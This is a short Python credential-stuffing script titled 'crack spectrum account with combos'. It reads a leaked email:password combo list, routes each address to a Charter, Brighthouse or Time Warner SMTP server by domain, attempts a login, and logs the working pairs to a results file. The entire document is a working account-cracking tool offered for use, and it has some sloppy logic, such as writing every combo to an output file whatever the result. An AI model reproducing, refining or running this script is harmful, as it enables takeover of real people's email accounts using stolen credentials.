# crack spectrum account with combos
# check for spectrum combo list with smtp login
import smtplib
import ssl
import certifi


def authenticate_spectrum_smtp(username, password):
    try:
        with open("results.txt", "a") as results:
            # Connect to the spectrum SMTP server
            hostname = 'mail.brighthouse.com'
            mail_domain = username.split("@")[1]
            if mail_domain == "spectrum.net" or mail_domain == "charter.net" or mail_domain == "bresnan.com":
                hostname = 'mobile.charter.net'
            elif mail_domain == "brighthouse.com" or mail_domain == "bak.rr.com" or mail_domain == "bham.rr.com" or mail_domain == "cfl.rr.com" or mail_domain == "emore.rr.com" or mail_domain == "eufala.rr.com" or mail_domain == "indy.rr.com" or mail_domain == "mi.rr.com" or mail_domain == "panhandle.rr.com" or mail_domain == "tampabay.rr.com":
                hostname = 'mail.brighthouse.com'
            elif "rr.com" in mail_domain:
                hostname = 'mail.twc.com'

            server = smtplib.SMTP(hostname, 587)
            server.ehlo()
            server.starttls()

            # Login with the provided username and password
            server.login(username, password)

            # Authentication successful
            print("Authentication successful!")
            results.write(f"{line[-2]}\n")

            # Close the connection
            server.quit()
    except Exception as e:
        print("Authentication failed:", str(e))


# Replace 'username' and 'password' with your actual login credentials
 
filename = input("enter file name:  ")

with open(filename, "r", encoding="utf-8") as file, open("spectrums.txt", "a") as results:
    combos = file.readlines()
    for combo in combos:
        try:
            line = combo.split(":")
            if "@" in line[-2] and "." in line[-2]:
                authenticate_spectrum_smtp(line[-2], line[-1])
                results.write(f"{line[-2]}:{line[-1]}\n")
        except Exception as ex:
            pass

print("Done!")
